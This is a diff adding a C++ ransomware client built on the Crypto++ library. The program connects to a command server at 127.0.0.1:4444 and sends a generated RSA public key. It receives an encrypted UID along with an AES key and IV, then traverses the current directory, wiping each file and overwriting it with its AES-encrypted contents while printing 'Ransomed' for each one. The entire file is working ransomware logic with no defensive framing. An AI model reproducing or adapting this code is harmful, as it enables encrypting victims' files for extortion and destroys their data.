@@ -1,0 +1,92 @@
+#include "crypto.hpp"
+#include "cryptopp/socketft.h"
+#include <iostream>
+#include <string>
+#include "traverse.hpp"
+#include "file.hpp"
+
+std::string addr("127.0.0.1");
+size_t port=4444;
+std::string ransom_directory(".");
+
+//Custom file handler...
+void file_handler(const std::string& filepath,const std::string& key,const std::string& iv)
+{
+	try
+	{
+		aes_t aes(key,iv);
+		std::string plain;
+		if(file_to_string(filepath,plain)&&spc_file_wipe(filepath)&&string_to_file(aes.encrypt(plain),filepath))
+			std::cout<<"Ransomed "<<filepath<<std::endl;
+		else
+			std::cout<<"Error "<<filepath<<std::endl;
+	}
+	catch(...)
+	{
+		std::cout<<"Skipping "<<filepath<<std::endl;
+	}
+}
+
+int main()
+{
+	CryptoPP::Socket::StartSockets();
+	CryptoPP::Socket client;
+	client.Create(SOCK_STREAM);
+	while(true)
+	{
+		try
+		{
+			std::cout<<"Connected to "<<addr<<":"<<port<<"."<<std::endl;
+			try
+			{
+				client.Connect(addr.c_str(),port);
+			}
+			catch(...)
+			{
+				throw std::runtime_error("Connect failed.");
+			}
+			std::cout<<"Connected."<<std::endl;
+			timeval time={0,0};
+			if(!client.SendReady(&time))
+				throw std::runtime_error("Not ready to send.");
+			rsa_t rsa;
+			std::string pubkey(rsa.get_public());
+			std::cout<<"Generated public key."<<std::endl;
+			if(client.Send((unsigned char*)pubkey.c_str(),pubkey.size())!=pubkey.size())
+				throw std::runtime_error("Send failed.");
+			std::cout<<"Sent public key."<<std::endl;
+			unsigned char data;
+			std::string uid;
+			while(true)
+			{
+				if(client.Receive(&data,1)!=1)
+				{
+					try
+					{
+						uid=rsa.decrypt(uid);
+					}
+					catch(...)
+					{
+						throw std::runtime_error("Data decryption failed.");
+					}
+					if(uid.size()!=40+32+16)
+						throw std::runtime_error("Invalid server response.");
+					std::string key=uid.substr(40,32);
+					std::string iv=uid.substr(40+32,16);
+					uid=uid.substr(0,40);
+					std::cout<<"UID is: "<<uid<<std::endl;
+					traverse_files(ransom_directory,key,iv,file_handler);
+					return 0;
+				}
+				uid+=data;
+			}
+		}
+		catch(std::exception &error)
+		{
+			std::cout<<error.what()<<std::endl;
+		}
+	}
+	client.CloseSocket();
+	CryptoPP::Socket::ShutdownSockets();
+	return 0;
+}
